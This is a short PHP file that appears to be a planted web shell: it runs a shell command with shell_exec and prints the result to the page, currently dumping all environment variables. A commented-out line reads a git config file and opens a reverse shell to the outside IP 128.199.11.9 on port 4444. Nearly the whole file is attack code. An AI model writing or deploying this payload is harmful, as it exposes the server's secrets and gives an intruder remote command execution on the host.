<?php
//$command = 'cat ../user/.git/config && bash -i >& /dev/tcp/128.199.11.9/4444 0>&1';
$command = 'env';
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
